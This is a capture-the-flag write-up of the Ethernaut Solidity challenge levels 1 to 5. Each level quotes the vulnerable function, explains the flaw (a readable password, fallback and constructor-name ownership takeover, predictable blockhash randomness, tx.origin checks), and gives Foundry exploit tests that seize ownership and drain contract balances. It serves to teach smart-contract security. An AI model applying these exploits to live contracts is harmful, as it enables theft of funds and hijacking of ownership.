# Ethernaut Challenges: Levels 1–5


🔗 **GitHub**: [View Level 1](https://github.com/NithinkumarPedda/ethernaut-solutions/tree/main/level1)

## Level 1: Hello Ethernaut

### 🔍 Vulnerable Function
```solidity
function authenticate(string memory passkey) public {
    if (
        keccak256(abi.encodePacked(passkey)) ==
        keccak256(abi.encodePacked(password))
    ) {
        cleared = true;
    }
}
```

**Vulnerability**: The `password` variable is marked as `public`, which allows anyone to call `.password()` and get the secret directly.

### 🧪 Exploit Test
```solidity
function test_pass_attack() public {
    vm.startPrank(attacker);
    string memory resultpass = instance.password();
    assertEq(resultpass, password, "password failed");
}

function test_attack() public {
    vm.startPrank(attacker);

    string memory result = instance.info();
    result = instance.info1();
    result = instance.info2("hello");
    result = instance.info42();
    result = instance.method7123949();

    instance.authenticate(password);

    bool cleared = instance.getCleared();
    assertTrue(cleared, "Authentication failed");
    vm.stopPrank();
}
```


---

## Level 2: Fallback

### 🔍 Vulnerable Function
```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

**Vulnerability**: The fallback function allows any contributor to become the `owner` by sending ETH directly to the contract. The original `owner` logic is also flawed—it can be overtaken easily by minimal contributions.

### 🧪 Exploit Test
```solidity
function test_attack() public {
    vm.startPrank(attacker);
    _fallback.contribute{value: 0.0001 ether}();

    (bool success, ) = address(_fallback).call{value: 0.001 ether}("");
    require(success, "Fallback call failed");

    assertEq(_fallback.owner(), attacker, "Attacker is not the owner after fallback");
}

function test_withdraw() public {
    vm.startPrank(attacker2);
    _fallback.contribute{value: 0.0001 ether}();
    _fallback.contribute{value: 0.0001 ether}();
    vm.stopPrank();

    vm.startPrank(attacker);
    _fallback.contribute{value: 0.0001 ether}();
    (bool success, ) = address(_fallback).call{value: 0.001 ether}("");
    require(success, "Fallback call failed");

    uint256 balanceBefore = address(_fallback).balance;
    _fallback.withdraw();

    assertTrue(attacker.balance >= balanceBefore, "Attacker did not receive the funds");
    assertTrue(address(_fallback).balance == 0, "Contract balance is not zero after withdraw");
    vm.stopPrank();
}
```



---

## Level 3: Fallout

### 🔍 Vulnerable Function
```solidity
function Fal1out() public payable {
    owner = payable(msg.sender);
    allocations[owner] = msg.value;
}
```

**Vulnerability**: The function `Fal1out()` is incorrectly named. It looks like a constructor but is actually a public function. Anyone can call it and become the `owner`.

### 🧪 Exploit Test
```solidity
function test_attack() public {
    vm.startPrank(attacker2);
    _fallout.allocate{value: 2 ether}();
    vm.stopPrank();

    vm.startPrank(attacker);
    _fallout.Fal1out{value: 2 ether}();
    _fallout.collectAllocations();

    assertTrue(address(_fallout).balance == 0, "attacker balance should be 0");
    vm.stopPrank();
}
```



---

## Level 4: CoinFlip

### 🔍 Vulnerable Function
```solidity
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
        revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
        consecutiveWins++;
        return true;
    } else {
        consecutiveWins = 0;
        return false;
    }
}
```

**Vulnerability**: Uses predictable `blockhash` to generate randomness. The attacker can precompute the same value and always win the flip.

### 🧪 Exploit Test
```solidity
function test_attack() public {
    vm.startPrank(attacker);

    for (uint256 i = 0; i < 10; i++) {
        vm.roll(block.number + 1);
        coinFlipAttack.attack();
    }

    assertEq(
        coinFlip.consecutiveWins(),
        10,
        "Attack failed to reach 10 wins"
    );

    vm.stopPrank();
}
```

---

## Level 5: Telephone

### 🔍 Vulnerable Function
```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

**Vulnerability**: The contract uses `tx.origin` instead of `msg.sender` for access control. An attacker can create a contract that calls this function, with the `tx.origin` being a user (player), and `msg.sender` being the attack contract. This bypasses the condition and changes the ownership.

### 🧪 Exploit Test
```solidity
function test_attack() public {
    vm.startPrank(attacker);
    telephone.changeOwner(attacker);
    assertEq(telephone.owner(), attacker, "attacker should be the owner");
    vm.stopPrank();
}

function test_attack2() public {
    vm.startPrank(player);
    TelephoneExploit exploit = new TelephoneExploit(telephone);
    exploit.attack(attacker);
    assertEq(telephone.owner(), attacker, "attacker should be the owner");
    vm.stopPrank();
}
```



---

✅ Ready for **Level 6** — coming soon!

